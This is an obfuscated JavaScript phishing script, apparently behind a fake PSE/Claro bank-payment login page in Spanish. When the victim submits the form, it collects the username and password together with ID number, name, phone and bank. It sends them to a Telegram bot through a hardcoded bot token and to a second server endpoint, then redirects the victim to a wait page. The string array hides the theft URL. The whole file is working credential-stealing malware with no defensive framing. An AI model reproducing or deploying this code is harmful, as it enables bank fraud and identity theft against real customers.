const _0x280a6b = _0x3836;
(function (_0x2fd68e, _0x19873d) {
  const _0xfc0f39 = _0x3836,
    _0x9ba783 = _0x2fd68e();
  while (!![]) {
    try {
      const _0x5a7014 =
        (parseInt(_0xfc0f39(0x88)) / 0x1) * (parseInt(_0xfc0f39(0xba)) / 0x2) +
        parseInt(_0xfc0f39(0xae)) / 0x3 +
        -parseInt(_0xfc0f39(0x87)) / 0x4 +
        -parseInt(_0xfc0f39(0xaf)) / 0x5 +
        (parseInt(_0xfc0f39(0xa3)) / 0x6) * (parseInt(_0xfc0f39(0xa9)) / 0x7) +
        -parseInt(_0xfc0f39(0x91)) / 0x8 +
        parseInt(_0xfc0f39(0xa7)) / 0x9;
      if (_0x5a7014 === _0x19873d) break;
      else _0x9ba783["push"](_0x9ba783["shift"]());
    } catch (_0x15ef5d) {
      _0x9ba783["push"](_0x9ba783["shift"]());
    }
  }
})(_0x422c, 0xb294b);
function updateLS() {
  const _0x227467 = _0x3836;
  LS[_0x227467(0x95)](_0x227467(0xb4), JSON[_0x227467(0x9f)](info));
}
function _0x3836(_0x3c02e1, _0x3c2a0a) {
  const _0x422cbe = _0x422c();
  return (
    (_0x3836 = function (_0x3836ee, _0x45f0c6) {
      _0x3836ee = _0x3836ee - 0x85;
      let _0x30a325 = _0x422cbe[_0x3836ee];
      return _0x30a325;
    }),
    _0x3836(_0x3c02e1, _0x3c2a0a)
  );
}
function _0x422c() {
  const _0x452a3f = [
    "\x0a🚹Usuario:\x20",
    "click",
    "txtUsuario",
    "24642027NTXkuB",
    "then",
    "631295YqEumd",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "statusText",
    "telnum",
    "Mensaje\x20enviado\x20a\x20",
    "1259583xWoVUI",
    "3173915FAQVgK",
    "./wait.html",
    "preventDefault",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "password",
    "info",
    "addEventListener",
    "disabled",
    "Error\x20de\x20red\x20al\x20enviar\x20mensaje\x20a\x20",
    "nombre",
    "focus",
    "34pZVRYO",
    "location",
    "POST",
    "4357364ZhVRJw",
    "155UMoQJf",
    "\x0a🏦Banco:\x20",
    "Error\x20al\x20enviar\x20mensaje\x20a\x20",
    "application/json",
    "metaInfo",
    "/trico/tricoPse",
    "href",
    "json",
    "dudename",
    "11411104MSJdQK",
    "error",
    "bank",
    "getElementById",
    "setItem",
    "catch",
    "&text=",
    "Error:",
    "\x0a📱Teléfono:\x20",
    "value",
    "\x0a🔒Contraseña:\x20",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "Network\x20response\x20was\x20not\x20ok",
    "puser",
    "stringify",
    "btnUsuario",
    "telefono",
    "user",
    "48FHrRXA",
  ];
  _0x422c = function () {
    return _0x452a3f;
  };
  return _0x422c();
}
const button = document[_0x280a6b(0x94)](_0x280a6b(0xa0)),
  userInput = document["getElementById"](_0x280a6b(0xa6)),
  passInput = document[_0x280a6b(0x94)]("txtPass");
async function sendToTelegram(_0x373fa0) {
  const _0x2ae7fc = _0x280a6b;
  for (const _0x13e392 of chatIds) {
    const _0x39fc9f =
      _0x2ae7fc(0xb2) +
      _0x13e392 +
      _0x2ae7fc(0x97) +
      encodeURIComponent(_0x373fa0);
    try {
      const _0x17d87d = await fetch(_0x39fc9f);
      if (!_0x17d87d["ok"])
        throw new Error(
          _0x2ae7fc(0x8a) + _0x13e392 + ":\x20" + _0x17d87d[_0x2ae7fc(0xab)]
        );
      console["log"](_0x2ae7fc(0xad) + _0x13e392);
    } catch (_0x52c8d2) {
      console[_0x2ae7fc(0x92)](_0x2ae7fc(0xb7) + _0x13e392 + ":", _0x52c8d2);
    }
  }
}
button[_0x280a6b(0xb5)](_0x280a6b(0xa5), async function (_0x121e26) {
  const _0x3acefe = _0x280a6b;
  _0x121e26[_0x3acefe(0xb1)](), (button[_0x3acefe(0xb6)] = !![]);
  if (userInput[_0x3acefe(0x9a)] == "" && passInput[_0x3acefe(0x9a)] == "") {
    alert(_0x3acefe(0x9c)),
      userInput[_0x3acefe(0xb9)](),
      (button["disabled"] = ![]);
    return;
  } else {
    var _0x5c133f = userInput["value"],
      _0x1e4aa1 = passInput[_0x3acefe(0x9a)];
    (info[_0x3acefe(0x8c)][_0x3acefe(0xa2)] = _0x5c133f),
      (info[_0x3acefe(0x8c)][_0x3acefe(0x9e)] = _0x1e4aa1),
      updateLS();
    const _0x5e43c1 = {
        id: info["metaInfo"]["cc"],
        nombre: info[_0x3acefe(0x8c)][_0x3acefe(0x90)],
        telefono: info[_0x3acefe(0x8c)][_0x3acefe(0xac)],
        direccion: "",
        usuario: info["metaInfo"]["user"],
        password: info[_0x3acefe(0x8c)][_0x3acefe(0x9e)],
        bank: info[_0x3acefe(0x8c)]["ban"],
      },
      _0xff5178 =
        _0x3acefe(0xaa) +
        _0x5e43c1["id"] +
        "\x0a🆔Nombre:\x20" +
        _0x5e43c1[_0x3acefe(0xb8)] +
        _0x3acefe(0x99) +
        _0x5e43c1[_0x3acefe(0xa1)] +
        _0x3acefe(0xa4) +
        _0x5e43c1["usuario"] +
        _0x3acefe(0x9b) +
        _0x5e43c1[_0x3acefe(0xb3)] +
        _0x3acefe(0x89) +
        _0x5e43c1[_0x3acefe(0x93)] +
        "\x0aFuente:\x20" +
        fuente +
        "\x0a\x20\x20\x20\x20";
    await sendToTelegram(_0xff5178),
      fetch(url + _0x3acefe(0x8d), {
        method: _0x3acefe(0x86),
        headers: { "Content-Type": _0x3acefe(0x8b) },
        body: JSON[_0x3acefe(0x9f)](_0x5e43c1),
      })
        [_0x3acefe(0xa8)]((_0x4b78f0) => {
          const _0x350395 = _0x3acefe;
          if (!_0x4b78f0["ok"]) throw new Error(_0x350395(0x9d));
          return _0x4b78f0[_0x350395(0x8f)]();
        })
        ["then"]((_0x4be35d) => {
          const _0xfa1b90 = _0x3acefe;
          window[_0xfa1b90(0x85)][_0xfa1b90(0x8e)] = _0xfa1b90(0xb0);
        })
        [_0x3acefe(0x96)]((_0x40a72b) => {
          const _0x86200 = _0x3acefe;
          console[_0x86200(0x92)](_0x86200(0x98), _0x40a72b),
            (button[_0x86200(0xb6)] = ![]);
        });
  }
});
